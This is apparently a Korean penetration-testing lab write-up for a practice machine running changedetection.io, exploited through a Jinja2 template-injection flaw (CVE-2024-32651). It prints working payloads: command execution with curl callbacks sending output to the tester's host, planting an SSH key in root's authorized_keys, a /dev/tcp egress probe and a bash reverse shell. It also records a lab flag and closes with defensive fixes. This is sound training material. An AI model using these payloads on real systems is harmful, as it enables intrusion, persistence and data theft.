---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/ssti
  - tech/payload/revshell
  - tech/cred/ssh-key
type: machine
platform: pg
os: linux
status: solved
manual_tags: true
manual_cves: true
ip: 192.168.248.97
ports: [22, 5000]
services: [ssh, http]
cves: [CVE-2024-32651]
difficulty: Fundamental
flags: 1
---

> [!info] 요약
> 타겟 192.168.248.97 · Ubuntu 20.04 · Fundamental · 플래그 1개(root only)
> 5000/tcp = **changedetection.io v0.45.1**, 무인증. CVE-2024-32651 Jinja2 SSTI 로 RCE.
> 앱이 **root 로 구동** → SSTI 명령이 곧 root 명령. SSH 공개키를 심어 대화형 root 셸 확보.
> 경로: `/settings` 알림 본문에 Jinja2 페이로드 → 저장 시 렌더 → root 실행.

## 0. 이 박스에서 배우는 것

- **버전 배지 → CVE 직행.** 웹앱 UI 에 버전이 그대로 노출되면 그 버전의 공개 취약점부터 확인.
- **Jinja2 SSTI 의 표준 탈출 체인** — `{{ self.__init__.__globals__.__builtins__.__import__('os').popen(...).read() }}`.
- **SSTI 로 셸을 띄울 때 popen 은 비블로킹으로 구성할 것** — 블로킹 페이로드 하나로 5000/tcp 가 통째로 무응답이 됨(6장 실측).
- **아웃바운드 리버스셸이 안 붙을 때 원인을 계층별로 분리** — 방화벽/egress 와 리스너 점유는 다른 문제.
- **시험 출제 가능성**: SSTI(Flask/Jinja2)는 OSCP·유사 랩의 단골. 변형은 알림·템플릿·프로필 필드 등 「사용자 입력이 서버 템플릿으로 렌더되는」 모든 지점.

## 1. 정찰

### Nmap
`nnmap`(별칭) 대신 recon.sh 가 실행한 형태. 출처: `~/PG/Detection/nmap-quick.txt`
```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Python http.server 3.5 - 3.10
|_http-title: Change Detection
```
- `-p-` 전체 스캔 → **추가 TCP 포트 없음**(`nmap-full.txt`). 22·5000 이 전부.
- UDP top-100 은 10개 `closed` · 90개 `open|filtered`(무응답, `--max-retries 1`). **UDP 를 배제한 것이 아니라 미확정**(`nmap-udp-top100.txt`).
- `Python http.server 3.5 - 3.10` 은 배너가 아니라 nmap 의 추정. 응답에 `Server` 헤더가 아예 없음(`web-5000/root.headers`). 실제는 changedetection.io(Flask 앱). **자동 판정을 서비스 근거로 쓰지 말 것** — 아래 두 근거로 교차.

### 서비스 식별 — 버전 판정 독립 근거 2개
1. 응답 본문 문자열 `v0.45.1` (`web-5000/root.body`)
2. UI 우상단 버전 배지 `v0.45.1` (스크린샷)

![[PG-Detection-changedetection-index-5000.png]]

→ changedetection.io 0.45.1. `/` 가 200 으로 워치 목록을 그대로 노출 = **인증 게이트 없음**.

### 열거
gobuster(출처 `~/PG/Detection/gobuster-5000.txt`):
```
/login                (Status: 200) [Size: 11444]
/logout               (Status: 302) [Size: 189] [--> /]
/backup               (Status: 200) [Size: 40480]
/import               (Status: 200) [Size: 15099]
/settings             (Status: 200) [Size: 41520]
```
- `/settings` 가 이 박스의 **SSTI sink**(2·3장). `/backup`·`/import`·`/settings` 는 상단 네비게이션에도 그대로 노출돼 있어 열거 없이도 도달 가능(스크린샷).
- `/backup` 은 무인증으로 **전체 설정 zip** 을 내려줌(실제 회수는 root 획득 후). 회수본은 40,696 B 로 gobuster 측정치(40,480 B)와 다름 — 요청마다 zip 을 새로 만들어 크기가 달라지는 것으로 보임 [가정].
- zip 안 `url-watches.json` 의 `password: false` = 앱 비밀번호 미설정. `/login` 은 존재하나 우회할 게이트가 애초에 없음. 같은 zip 에 `secret.txt`·API 토큰도 들어 있으나 **추가 플래그는 없음**(출처 `~/PG/Detection/backup_extract/`).

## 2. 취약점 분석 — CVE-2024-32651

### 배경
changedetection.io — 워치에 변화가 생기면 알림(apprise) 발송. 알림 제목·본문·URL 은 Jinja2 템플릿으로 렌더돼 `{{watch_url}}`·`{{diff}}` 같은 토큰을 치환(설정 화면 하단 토큰 표에 명시). 이 템플릿 렌더가 **샌드박스 없이** 돌아 임의 Jinja2 표현식을 평가함 = SSTI. 0.45.20 «이하» 해당, 0.45.21 에서 패치(NVD·GitHub Advisory GHSA-4r7v-whpg-8rx3). CVSS 3.1 = 10.0.

![[PG-Detection-notification-ssti-payload.png]]

### 왜 이 페이로드인가
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('<cmd>').read() }}
```
조각별 역할:
- `self` — Jinja2 가 템플릿 컨텍스트에 넣어주는 `TemplateReference` 객체.
- `.__init__.__globals__` — 그 객체 초기화 함수의 전역 네임스페이스(= `jinja2.runtime` 모듈). 여기에 `__builtins__` 가 들어 있음.
- `.__builtins__.__import__('os')` — 내장 `__import__` 로 `os` 모듈 로드.
- `.popen('<cmd>').read()` — 명령 실행 후 stdout 을 문자열로 회수.

**이 체인은 「샌드박스를 뚫는」 것이 아니라 「샌드박스가 없어서」 통하는 것**(Kali jinja2 3.1.6 에서 직접 실행해 확인). `SandboxedEnvironment` 로 렌더하면 첫 홉에서 막힘:
```
jinja2.exceptions.SecurityError: access to attribute '__init__' of 'TemplateReference' object is unsafe.
```
→ 8장의 대책(샌드박스 환경 사용)이 실제로 유효한 이유.

**⚠️ 인용 규칙** — 바깥(Jinja2 문자열)과 안쪽(셸 명령)의 따옴표를 **서로 다르게** 쓸 것. 산출물 실제 형태도 그러함 — `p1.j2`·`p3_revshell.j2` 는 바깥 큰따옴표 + 안쪽 따옴표 없음, `p4_diag.j2`·`p6_sshkey.j2` 는 바깥 홑따옴표 + 안쪽 큰따옴표. 같은 종류로 중첩하면 페이로드가 깨짐(6장 ③).

### 트리거 지점 — 사전 정보와 달랐던 곳
공개 PoC·사전 정보는 「알림 본문에 페이로드 저장 후 Send test notification 클릭」으로 설명함. **실측은 다름:**
- `/notification/send-test` 로 보낸 알림은 **저장된 제목·본문이 아니라 기본값**을 씀. 저장돼 있던 값이 SSTI 페이로드였는데도 443 리스너에 도착한 apprise POST 원문은 기본 문구였음(`listener/nc443.log`):
  ```
  {"version": "1.0", "title": "ChangeDetection.io Notification - http://192.168.248.97:5000/settings", "message": "http://192.168.248.97:5000/settings had a change.\n---\n\n---", "attachments": [], "type": "info"}
  ```
- 그런데 `POST /settings` 저장 그 자체에서 본문이 이미 렌더됨. `id` 콜백이 위 apprise POST 가 443 리스너에 찍히기 **전에** 80 리스너에 도착:
  ```
  192.168.248.97 - - [21/Aug/2026 13:41:54] "GET /hit-p1-dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCkK HTTP/1.1" 404 -
  # base64 -d → uid=0(root) gid=0(root) groups=0(root)
  ```
  (출처 `listener/http80.log`. 13:42:24 의 두 번째 저장에서도 `/hit-title`·`/hit-body` 가 **둘 다** 콜백 = 제목·본문 양쪽이 렌더 sink)
→ **트리거는 test 알림이 아니라 `POST /settings` 저장 시점의 렌더임.** 저장 폼 검증 단계에서 렌더된다는 것은 관측된 타이밍에서의 추론 [가정] — 확실한 것은 「저장만으로 실행됐다」는 것.

## 3. Foothold

### RCE 확인 (비블로킹 콜백)
`~/PG/Detection/ssti/save_settings.py` — 세션 쿠키·CSRF 회수 → 전체 설정 필드 POST → 저장 확인. 알림 본문에 SSTI 를 넣고, Kali HTTP 리스너로 명령 결과를 콜백 회수:
출처 `~/PG/Detection/ssti/p1.j2`:
```
{{ self.__init__.__globals__.__builtins__.__import__("os").popen("curl -s http://192.168.45.207/hit-p1-$(id | base64 -w0)").read() }}
```
→ 콜백 base64 = `uid=0(root) gid=0(root) groups=0(root)`. **앱이 root 로 구동** — `harvest_root.txt` PROCS 에 `root 844 ... /usr/bin/python3 /usr/local/bin/changedetection.io -d /opt/detection -p 5000`.

### 대화형 root 셸 — SSH 키 심기
리버스셸을 popen 안에서 직접 띄우면 앱이 죽음(6장). 대신 **비블로킹** 명령으로 root `authorized_keys` 에 공개키를 심고, 앱과 독립된 sshd 채널로 진짜 pty 를 얻음:
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('mkdir -p /root/.ssh; chmod 700 /root/.ssh; echo "<ed25519 pubkey>" >> /root/.ssh/authorized_keys; chmod 600 /root/.ssh/authorized_keys; curl -s http://192.168.45.207/keyplanted-$(wc -l < /root/.ssh/authorized_keys)').read() }}
```
- 명령이 전부 **즉시 반환**(mkdir/echo/chmod/curl) → popen 이 바로 끝나 요청 스레드가 막히지 않음.
- 콜백 `GET /keyplanted-1` = 키 1줄 등록 성공.
```
ssh -i det_key root@192.168.248.97
```
타겟 pty(실측, `~/PG/Detection/proof_root.txt`):
```
root@detection:~# find / -name proof.txt -o -name local.txt 2>/dev/null
/root/proof.txt
```
이미 root — 별도 권한상승 불필요(SSTI sink 가 root 프로세스).

**⚠️ 자동 도구 미사용.** 전 과정 수동 curl/python + 공개 CVE PoC 기법(허용). 리버스셸을 쓸 경우의 수동 대안은 6장·7장.

## 4. 권한상승

없음 — **초기 접근이 곧 root**. changedetection.io 프로세스가 root 로 떠 있어(harvest: `changedetection pid 844 ... root`) SSTI 명령이 처음부터 uid=0.

셸 직후 열거 결과(출처 `~/PG/Detection/harvest_root.txt`, 1336행 전량 보존). SUDO 섹션:
```
User root may run the following commands on detection:
    (ALL : ALL) ALL
```
- SUID 섹션은 40개 — `/usr/bin/{fusermount,sudo,su,umount,passwd,chsh,chfn,at,mount,newgrp,gpasswd}` + `/usr/lib/{dbus-daemon-launch-helper,ssh-keysign,dmcrypt-get-device,snap-confine}` + `/snap/core20/2015/...` 중복분. **전부 Ubuntu 20.04 표준**이라 권한상승 경로 아님(이미 root 라 필요도 없음).

## 5. 플래그

- `/root/proof.txt` — **박스 유일 플래그**. harvest.sh 전수 탐색(FLAGS 섹션)에 `local.txt`/user flag 없음. 포털도 플래그 슬롯 1개이고 제출로 Lab Complete 1/1 확정.
  ```
  -rwx------ 1 root root 33 Aug 21 05:05 /root/proof.txt
  ```
- 값: `05a2b432fb4eb4091fb7ed500bb7a9bd`
- 대화형 root SSH pty 에서 회수(웹셸·SSTI 아님 = 시험 유효). 증거: `proof_root.txt` 의 `root@detection:~#` 프롬프트 + `whoami; id; hostname; hostname -I; date; cat /root/proof.txt` 한 화면.

## 6. 막혔던 지점 / 시행착오

### ① 진입점을 내 페이로드로 죽임
1차 시도에서 `popen('... | base64 -d | python3').read()` 로 pty 리버스셸을 띄웠고 root 셸을 잡았음(`pty_shell_evidence.log` 의 `root@detection:/#`). 그런데 같은 페이로드를 재발사하자 `popen(...).read()` 가 블로킹이라 `pty.spawn` 이 종료되지 않아 flask 요청 스레드가 영구 점유됨. 결과는 **5000/tcp 전체 무응답**(nmap `filtered`, tcpdump 상 SYN 9회 전부 무응답 = accept 백로그 포화).
- 백로그 크기는 **50**(`harvest_root.txt` LISTEN 섹션의 `tcp LISTEN 0 50 0.0.0.0:5000 ... changedetection,pid=844`). 「요청을 사실상 순차 처리한다」는 것은 이 현상에서의 추론 [가정] — 관측된 사실은 「블로킹 요청 하나 뒤로 accept 가 멈췄다」까지.
- 인바운드로 타겟 프로세스를 죽일 방법이 없어 **리버트가 유일한 해소책**이었음.
- 복구 시도(전부 실패): Kali 고아 리스너 kill → 무효. scapy 로 타겟 고아 소켓에 SYN→challenge ACK→RST 유도해 TCP 소켓은 죽였음(pcap 에서 타겟의 `R.` 응답 확인). 그럼에도 앱은 미복구 — 타겟 쪽 python3 가 stdin EOF 후에도 master_fd 를 계속 기다려 살아남은 것으로 판단 [가정]. **타겟 프로세스 상태는 앱이 죽은 뒤라 관측할 수 없었음**(`cleanup.txt` 에도 「추정, 관측 불가」로 기록).
- **교훈**: SSTI 로 명령 실행 시 popen 을 붙잡지 말 것. `setsid nohup <cmd> >/dev/null 2>&1 </dev/null &` 로 떼어내고 결과는 아웃바운드 콜백으로만 받을 것. 2차에서 SSH 키 심기(전부 비블로킹)로 전환해 해결.

### ② 「Send test notification 이 트리거」라는 오해
사전 정보·PoC 대로 test 만 눌렀으면 못 뚫었을 것. test 는 저장값이 아니라 기본 제목·본문을 보내 SSTI 가 안 탐. 실제 트리거는 **설정 저장**. 두 근거로 확정 — ⓐ `http80.log` 의 root 콜백(13:41:54)이 `nc443.log` 에 apprise POST 가 찍힌 시각보다 앞섬, ⓑ 저장값이 SSTI 페이로드였는데도 그 apprise POST 의 title·message 가 둘 다 기본 문구였음. ⓑ 쪽이 더 강함 — 시각 비교와 달리 「test 는 저장 본문을 아예 안 쓴다」를 내용만으로 보여줌.

### ③ 리버스셸이 안 붙어 방화벽을 의심 (계층 분리)
1차 리버스셸(443) 미접속. `ss` 로 보니 **제3 호스트 192.168.248.220 이 Kali 443 리스너를 점유**(`-k` 없는 nc 라 첫 연결 후 죽음)했던 것 — 방화벽이 아니었음. (이 IP 는 작업 중 `ss` 화면에서 읽은 값으로 `writeup_notes.txt` 에만 남아 있고 raw `ss` 출력은 미보존 [가정].)

egress 를 계층 분리해 측정 — SSTI 로 **stderr 를 base64 로 회수**하는 진단 페이로드(`ssti/p4_diag.j2`):
```
O=$( (timeout 6 bash -c "echo TEST443 > /dev/tcp/192.168.45.207/443") 2>&1 | base64 -w0 ); curl -s http://192.168.45.207/diag443-$O
```
→ 콜백이 `GET /diag443-`(base64 빈 문자열 = stderr 없음) + nc 로그에 `TEST443` = **443 아웃바운드 정상**. 「80만 허용」은 [가정]에 불과했고 반증됨.

**1차 생성물이 따옴표 중첩으로 깨져 이 진단 자체가 한 번 실패함.** 회수된 stderr base64 를 디코드하니 셸이 명령을 잘못 파싱한 것이 그대로 나옴:
```
/usr/bin/bash: line 53: 443": Servname not supported for ai_socktype
/usr/bin/bash: line 53: /dev/tcp/192.168.45.207/443": Invalid argument
```
→ 바깥 Jinja2 문자열과 안쪽 셸 명령에 같은 종류의 따옴표를 쓴 것이 원인(2장 인용 규칙). (이 실패 콜백은 `writeup_notes.txt` 에 base64 원문으로만 남아 있고 `http80.log` 에는 해당 줄이 없음 — 성공한 `GET /diag443-` 만 로그에 있음.) 부수 효과로 **「stderr 를 base64 콜백으로 빼는 것」 자체가 SSTI 디버깅 수단**임이 드러남 — 출력이 안 보이는 sink 에서 이게 유일한 피드백 채널.

### ④ tmux capture-pane 이 빈 화면
`sudo rlwrap nc | tee` 로 리스너를 만들면 tmux `capture-pane` 이 빈 페인을 반환함(파이프라인이 pty 를 안 거침). tee 로그에는 프롬프트가 있었음. **리스너를 tee 로 감싸지 말 것.** SSH 세션은 정상적으로 capture 됨.

## 7. OSCP 시험 관점

1. **UI 버전 배지 = 즉시 CVE 검색.** 무인증 웹앱이면 특히. 여기선 그것만으로 SSTI CVE 직행.
2. **SSTI 표준 탐지·탈출**: 입력 필드에 `{{7*7}}` → `49` 면 확정(Jinja2 3.1.6 에서 직접 확인). 탈출은 `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`. Flask 앱(포트 5000)에서 반사적으로 시도. 단 `SandboxedEnvironment` 면 이 체인은 막히므로 다른 gadget 필요.
3. **수동 대안(리버스셸)**: SSTI 로 `bash -c 'setsid nohup bash -i >& /dev/tcp/LHOST/443 0>&1 &'` — 반드시 `&`+`setsid` 로 분리. 이 형태는 이 박스에서 **쓰지 않았고 검증되지 않음** [가정]; 실제로 통한 것은 SSH 키 심기(가장 안정적, msfvenom 불필요).
   **출력이 안 보이는 sink 는 stderr 를 base64 로 아웃바운드 콜백에 실어 디버깅**(6장 ③). SSTI 는 렌더 결과가 화면에 안 돌아오는 경우가 많아 이것이 사실상 유일한 피드백 채널.
4. **시간 배분**: 정찰~버전판정 2분, SSTI 확인 5분. 여기서 **손절점은 「셸 잡고도 진입점을 죽였을 때」** — 리버트를 빨리 요청하는 편이 헤매는 것보다 나음. 데드락 복구에 시간 태우지 말 것.
5. **리버스셸 안 붙으면**: egress 포트(443→80→53)를 바꾸기 전에 **리스너가 실제로 살아 있는지·다른 것이 점유했는지 `ss` 로 먼저 확인할 것.** 계층 분리가 먼저.

## 8. 방어 관점

- changedetection.io 를 **0.45.21 이상으로 업그레이드**(0.45.20 까지가 취약).
- 알림 템플릿을 **샌드박스 Jinja2 환경**(`SandboxedEnvironment`)에서만 렌더 — 2장에서 실행해 확인한 대로 이 체인은 첫 홉(`__init__` 접근)에서 `SecurityError` 로 차단됨.
- 앱을 **비-root 전용 계정**으로 구동. root 로 띄우면 어떤 RCE 든 즉시 완전 장악.
- `/backup`·`/settings` 에 **인증 강제**. 무인증 설정 노출은 그 자체로 시크릿 유출.
- 리버스 프록시로 5000 을 직접 노출하지 말 것.

## 9. 참고 자료

- CVE-2024-32651 — changedetection.io **≤ 0.45.20** Jinja2 SSTI RCE, 0.45.21 에서 패치. CVSS 3.1 = 10.0 (NVD)
- GitHub Advisory `GHSA-4r7v-whpg-8rx3` — dgtlmoon/changedetection.io
- SSTI 탈출: Jinja2 `__globals__` → `__builtins__` → `os.popen`

## 남긴 흔적 / 관련 노트

- 타겟: `/root/.ssh/authorized_keys`(심은 키) 제거·파일 삭제 확인, `/tmp/.h.sh`·`/tmp/.h/`·`/root/.pt` 삭제, `/settings` 알림 본문 원복. `/root/.ssh` 빈 디렉터리는 남김([가정] 사전 존재 불명).
- Kali: 리스너(80/443/4444)·tmux(det-*) 전부 종료 확인(`ss`·`tmux ls`). 광범위 pkill 미사용, tmux 는 세션 이름으로만 종료.
- ⚠️ Kali 에 **이 작업 소유가 아닌 잔존 프로세스 1건**(pid 347623 `sudo nc -lvnp 80`, 작업 시작 이전부터 존재, LISTEN 아님) — 다른 작업 소유일 수 있어 손대지 않음(`cleanup.txt`).
- 산출물: `~/PG/Detection/`(nmap·gobuster·ssti/·backup·harvest·proof·cleanup·writeup_notes).
- 관련: 계층 분리 실패진단은 다른 리버스셸 박스와 공통 패턴.
